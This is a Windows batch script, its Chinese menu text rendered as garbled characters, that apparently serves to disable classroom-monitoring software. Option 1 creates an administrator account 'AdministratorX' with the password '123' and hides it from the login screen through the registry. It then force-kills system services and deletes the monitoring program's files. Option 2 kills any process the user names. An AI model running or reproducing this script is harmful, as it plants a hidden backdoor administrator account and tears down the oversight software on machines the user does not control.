cls
@echo off
title ���ӽ���ɱ��,������Windows 95/NT/98/ME/2000/XP/Vista/7
echo �汾��2.2
echo =====================================��ӭʹ��==================================
echo ��ѡ�����η�ʽ
echo 1.2000/XP�Զ�����(Ч��ǿ)
echo 2.�ֶ���������(�����ڸ߼��û�)
echo 3.2000/XP/Vista/7�Զ�����(�Ƽ�)
echo .
echo ���ִ���ѡ�����󰴻س���
set xp=0
set /p xp=
if %xp%==1 goto xp1
if %xp%==2 goto xp2
if %xp%==3 %temp%\autokill.bat
if %xp%==0 goto xp0
:xp1
cls
echo ��ȴ�...
title ����������...���Ե�
if not exist "%windir%\system32\taskmgr.exe" autokill.bat
net user AdministratorX /add
net localgroup administrators "AdministratorX" /add
net user AdministratorX 123
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AdministratorX /t REG_DWORD /d 0 /f
pv.exe -f -k tcpsvcs.exe
pv.exe -f -k *checkrs*.exe
pv.exe -f -k inetinfo.exe
pv.exe -f -k snmp.exe
pv.exe -f -k mqsvc.exe
pv.exe -f -k winmgmt.exe
del "%programfiles%\guanbao\ets classroom\*" /F /Q
cpau.exe -u administratorX -p 123 -ex autokill.bat -lwp
%windir%\system32\pv.exe tcpsvcs.exe
exit
:xp2
cls
"%temp%\pv.exe"
echo .
echo ʹ�ù����Բ쿴���������
echo �������������г���һ����Ե��ӽ��ҵ������򶼴���"student"���������ҵ����¼�³��������(����ʹ��ͨ�������*��)
echo ����������ʹ�õĵ��ӽ��ҵ���������(.exe����ʡ��)���س�ȷ�ϡ�
set /p name=
echo ����ǿ���ս�...
title ����������...���Ե�
cls
set erhalf=1
ntsd -c q -pn %name%
if not errorlevel 1 set erhalf=0
"%temp%\pv.exe" -f -k %name%
if not errorlevel 1 set erhalf=0
cls
if %erhalf%==0 echo ���γɹ���
if %erhalf%==0 title ���γɹ���
if %erhalf%==1 echo ����ʧ�ܣ�
if %erhalf%==1 title ����ʧ�ܣ�
pause
exit
:xp0
autokill.bat
exit